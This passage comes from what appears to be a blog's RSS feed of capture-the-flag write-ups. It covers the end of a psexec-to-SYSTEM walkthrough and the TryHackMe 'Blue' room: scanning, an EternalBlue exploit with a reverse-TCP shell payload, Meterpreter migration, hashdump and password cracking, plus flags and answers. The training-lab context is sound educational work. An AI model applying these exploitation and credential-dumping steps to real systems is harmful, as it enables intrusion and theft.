<p><code>psexec.py administrator@10.129.208.116</code></p>
<p><img src="image-4.png#center" alt="alt text"></p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>C:<span style="color:#89b4fa">\&gt;</span> whoami
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>nt authority<span style="color:#89b4fa">\s</span>ystem</span></span></code></pre></div>
<br>
<h4 id="submit-root-flag">Submit root flag</h4>






<pre tabindex="0"><code>f751c19eda8f61ce81827e6930a1f40c</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop/impacket<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ psexec.py administrator@10.129.208.116
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Impacket v0.12.0.dev1+20240725.125704.9f36a10e - Copyright <span style="color:#fab387">2023</span> Fortra
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Password:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Requesting shares on 10.129.208.116.....
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Found writable share ADMIN$
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Uploading file ckDQLGjh.exe
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Opening SVCManager on 10.129.208.116.....
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Creating service BjhK on 10.129.208.116.....
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Starting service BjhK.....
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>!<span style="color:#89dceb;font-weight:bold">]</span> Press <span style="color:#89dceb">help</span> <span style="color:#cba6f7">for</span> extra shell commands
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Microsoft Windows <span style="color:#89dceb;font-weight:bold">[</span>Version 10.0.17763.107<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#89dceb;font-weight:bold">(</span>c<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#fab387">2018</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>C:<span style="color:#89b4fa">\W</span>indows<span style="color:#89b4fa">\s</span>ystem32&gt; <span style="color:#89dceb">cd</span> <span style="color:#89b4fa">\
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span><span style="color:#89b4fa"></span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>C:<span style="color:#89b4fa">\&gt;</span> dir *flag* /s
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span> Volume in drive C has no label.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span> Volume Serial Number is EEE0-FCDB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span> Directory of C:<span style="color:#89b4fa">\U</span>sers<span style="color:#89b4fa">\A</span>dministrator<span style="color:#89b4fa">\A</span>ppData<span style="color:#89b4fa">\R</span>oaming<span style="color:#89b4fa">\M</span>icrosoft<span style="color:#89b4fa">\W</span>indows<span style="color:#89b4fa">\R</span>ecent
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>04/23/2021  02:38 AM               <span style="color:#fab387">551</span> flag.lnk
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>               <span style="color:#fab387">1</span> File<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>            <span style="color:#fab387">551</span> bytes
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span> Directory of C:<span style="color:#89b4fa">\U</span>sers<span style="color:#89b4fa">\A</span>dministrator<span style="color:#89b4fa">\D</span>esktop
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>04/23/2021  02:39 AM                <span style="color:#fab387">32</span> flag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>               <span style="color:#fab387">1</span> File<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>             <span style="color:#fab387">32</span> bytes
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>     Total Files Listed:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>               <span style="color:#fab387">2</span> File<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>            <span style="color:#fab387">583</span> bytes
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>               <span style="color:#fab387">0</span> Dir<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>   4,743,278,592 bytes free
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>C:<span style="color:#89b4fa">\&gt;</span> <span style="color:#89dceb">type</span> C:<span style="color:#89b4fa">\U</span>sers<span style="color:#89b4fa">\A</span>dministrator<span style="color:#89b4fa">\D</span>esktop<span style="color:#89b4fa">\f</span>lag.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>f751c19eda8f61ce81827e6930a1f40c</span></span></code></pre></div>
<br>
<p><img src="image-5.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[THM] Blue</title>
      <link>http://localhost:1313/thm-blue/</link>
      <pubDate>Thu, 25 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/thm-blue/</guid>
      <description>How many ports are open with a port number under 1000? 3 1(kalikali)-[~/Desktop] 2$ nmap -sC -sV 10.10.75.102 --min-rate 3000 -p- 3Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 12:11 EDT 4Nmap scan report for 10.10.75.102 5Host is up (0.093s latency). 6Not shown: 65526 closed tcp ports (conn-refused) 7PORT STATE SERVICE VERSION 8135/tcp open msrpc Microsoft Windows RPC 9139/tcp open netbios-ssn Microsoft Windows netbios-ssn 10445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 113389/tcp open ssl/ms-wbt-server?</description>
      <content:encoded><![CDATA[<h4 id="how-many-ports-are-open-with-a-port-number-under-1000">How many ports are open with a port number under 1000?</h4>






<pre tabindex="0"><code>3</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#89dceb;font-weight:bold">(</span>kalikali<span style="color:#89dceb;font-weight:bold">)</span>-<span style="color:#89dceb;font-weight:bold">[</span>~/Desktop<span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>$ nmap -sC -sV 10.10.75.102 --min-rate <span style="color:#fab387">3000</span> -p-
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.94SVN <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-07-25 12:11 EDT
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> 10.10.75.102
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.093s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">65526</span> closed tcp ports <span style="color:#89dceb;font-weight:bold">(</span>conn-refused<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT      STATE SERVICE            VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>135/tcp   open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>445/tcp   open  microsoft-ds       Windows <span style="color:#fab387">7</span> Professional <span style="color:#fab387">7601</span> Service Pack <span style="color:#fab387">1</span> microsoft-ds <span style="color:#89dceb;font-weight:bold">(</span>workgroup: WORKGROUP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>3389/tcp  open  ssl/ms-wbt-server?
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>| rdp-ntlm-info:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>|   Target_Name: JON-PC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>|   NetBIOS_Domain_Name: JON-PC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>|   NetBIOS_Computer_Name: JON-PC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>|   DNS_Domain_Name: Jon-PC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>|   DNS_Computer_Name: Jon-PC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>|   Product_Version: 6.1.7601
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>|_  System_Time: 2024-07-25T16:13:32+00:00
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>|_ssl-date: 2024-07-25T16:13:37+00:00; 0s from scanner time.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>| ssl-cert: Subject: <span style="color:#f5e0dc">commonName</span><span style="color:#89dceb;font-weight:bold">=</span>Jon-PC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>| Not valid before: 2024-07-24T16:09:38
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>|_Not valid after:  2025-01-23T16:09:38
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>49152/tcp open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>49153/tcp open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>49154/tcp open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>49158/tcp open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>49160/tcp open  msrpc              Microsoft Windows RPC
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows</span></span></code></pre></div>
<br>
<h4 id="what-is-this-machine-vulnerable-to-answer-in-the-form-of-ms--ex-ms08-067">What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)</h4>






<pre tabindex="0"><code>ms17-010</code></pre>
<p><img src="image.png#center" alt="alt text"></p>
<br>
<h4 id="start-metasploit">Start Metasploit</h4>
<h4 id="find-the-exploitation-code-we-will-run-against-the-machine-what-is-the-full-path-of-the-code">Find the exploitation code we will run against the machine. What is the full path of the code?</h4>






<pre tabindex="0"><code>exploit/windows/smb/ms17_010_eternalblue</code></pre>
<p><img src="image-1.png#center" alt="alt text"></p>
<br>
<h4 id="show-options-and-set-the-one-required-value-what-is-the-name-of-this-value-all-caps-for-submission">Show options and set the one required value. What is the name of this value? (All caps for submission)</h4>






<pre tabindex="0"><code>RHOSTS</code></pre>
<p><img src="image-2.png#center" alt="alt text"></p>
<br>
<p>Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:</p>
<p><code>set payload windows/x64/shell/reverse_tcp</code>.</p>
<p><img src="image-3.png#center" alt="alt text"></p>
<br>
<p>With that done, run the exploit!</p>
<p>Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL+Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.</p>
<br>
<p>Successfully ran the exploit and captured the shell.
<img src="image-4.png#center" alt="alt text"></p>
<br>
<h4 id="if-you-havent-already-background-the-previously-gained-shell-ctrl--z-research-online-how-to-convert-a-shell-to-meterpreter-shell-in-metasploit-what-is-the-name-of-the-post-module-we-will-use-exact-path-similar-to-the-exploit-we-previously-selected">If you haven&rsquo;t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)</h4>






<pre tabindex="0"><code>post/multi/manage/shell_to_meterpreter</code></pre>
<p>To convert a shell to Meterpreter shell in Metasploit, list all sessions by <code>sessions -l</code> and note the ID of the shell session you want to upgrade. Then upgrade the shell session to a Meterpreter session by <code>sessions -u &lt;id&gt;</code>.</p>
<p><img src="image-5.png#center" alt="alt text"></p>
<br>
<h4 id="select-this-use-module_path-show-options-what-option-are-we-required-to-change">Select this (use MODULE_PATH). Show options, what option are we required to change?</h4>






<pre tabindex="0"><code>SESSION</code></pre>
<p><img src="image-6.png#center" alt="alt text"></p>
<br>
<h4 id="once-the-meterpreter-shell-conversion-completes-select-that-session-for-use">once the meterpreter shell conversion completes, select that session for use.</h4>
<p><img src="image-7.png#center" alt="alt text"></p>
<br>
<h4 id="verify-that-we-have-escalated-to-nt-authoritysystem-run-getsystem-to-confirm-this-feel-free-to-open-a-dos-shell-via-command-shell-and-run-whoami-this-should-return-that-we-are-indeed-system-background-this-shell-afterwards-and-select-our-meterpreter-session-for-usage-again">Verify that we have escalated to NT AUTHORITY\SYSTEM. Run <code>getsystem</code> to confirm this. Feel free to open a dos shell via command <code>shell</code> and run <code>whoami</code>. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.</h4>
<br>
<h4 id="list-all-of-the-processes-running-via-the-ps-command-just-because-we-are-system-doesnt-mean-our-process-is-find-a-process-towards-the-bottom-of-this-list-that-is-running-at-nt-authoritysystem-and-write-down-the-process-id">List all of the processes running via the <code>ps</code> command. Just because we are system doesn&rsquo;t mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id.</h4>






<pre tabindex="0"><code>716</code></pre>
<p><img src="image-8.png#center" alt="alt text"></p>
<br>
<h4 id="migrate-to-this-process-using-the-migrate-process-id-command-where-the-process-id-is-the-one-you-just-wrote-down-in-the-previous-step-this-may-take-serveral-attempts-migrating-processes-is-not-very-stable-if-this-fails-you-may-need-to-re-run-the-conversion-process-or-reboot-the-machine-and-start-once-again">Migrate to this process using the <code>migrate &lt;process id&gt;</code> command where the process id is the one you just wrote down in the previous step. This may take serveral attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again.</h4>
<p><img src="image-9.png#center" alt="alt text"></p>
<br>
<h4 id="within-our-elevated-meterpreter-shell-run-the-command-hashdump-this-will-dump-all-of-the-password-on-the-machine-as-long-as-we-have-the-correct-privileges-to-do-so-what-is-the-name-of-the-non-default-user">Within our elevated meterpreter shell, run the command <code>hashdump</code>. This will dump all of the password on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?</h4>






<pre tabindex="0"><code>Jon</code></pre>
<p><img src="image-10.png#center" alt="alt text"></p>
<br>
<h4 id="copy-this-password-hash-to-a-file-and-research-how-to-crack-it-what-is-the-cracked-password">Copy this password hash to a file and research how to crack it. What is the cracked password?</h4>






<pre tabindex="0"><code>alqfna22</code></pre>
<p><img src="image-11.png#center" alt="alt text"></p>
<br>
<h4 id="flag1-this-flag-can-be-found-at-the-system-root">Flag1? This flag can be found at the system root.</h4>






<pre tabindex="0"><code>flag{access_the_machine}</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>meterpreter &gt; <span style="color:#89dceb">cd</span> ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>meterpreter &gt; ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Listing: C:<span style="color:#89b4fa">\
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#89b4fa"></span><span style="color:#89dceb;font-weight:bold">============</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Mode              Size   Type  Last modified              Name
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>----              ----   ----  -------------              ----
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>040777/rwxrwxrwx  <span style="color:#fab387">0</span>      dir   2018-12-12 22:13:36 -0500  <span style="color:#f5e0dc">$Recycle</span>.Bin
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>040777/rwxrwxrwx  <span style="color:#fab387">0</span>      dir   2009-07-14 01:08:56 -0400  Documents and Settings
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>040777/rwxrwxrwx  <span style="color:#fab387">0</span>      dir   2009-07-13 23:20:08 -0400  PerfLogs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>040555/r-xr-xr-x  <span style="color:#fab387">4096</span>   dir   2019-03-17 18:22:01 -0400  Program Files
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>040555/r-xr-xr-x  <span style="color:#fab387">4096</span>   dir   2019-03-17 18:28:38 -0400  Program Files <span style="color:#89dceb;font-weight:bold">(</span>x86<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>040777/rwxrwxrwx  <span style="color:#fab387">4096</span>   dir   2019-03-17 18:35:57 -0400  ProgramData
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>040777/rwxrwxrwx  <span style="color:#fab387">0</span>      dir   2018-12-12 22:13:22 -0500  Recovery
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>040777/rwxrwxrwx  <span style="color:#fab387">4096</span>   dir   2024-07-25 13:49:19 -0400  System Volume Information
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>040555/r-xr-xr-x  <span style="color:#fab387">4096</span>   dir   2018-12-12 22:13:28 -0500  Users
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>040777/rwxrwxrwx  <span style="color:#fab387">16384</span>  dir   2019-03-17 18:36:30 -0400  Windows
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>100666/rw-rw-rw-  <span style="color:#fab387">24</span>     fil   2019-03-17 15:27:21 -0400  flag1.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>000000/---------  <span style="color:#fab387">0</span>      fif   1969-12-31 19:00:00 -0500  hiberfil.sys
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>000000/---------  <span style="color:#fab387">0</span>      fif   1969-12-31 19:00:00 -0500  pagefile.sys
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>meterpreter &gt; cat flag1.txt
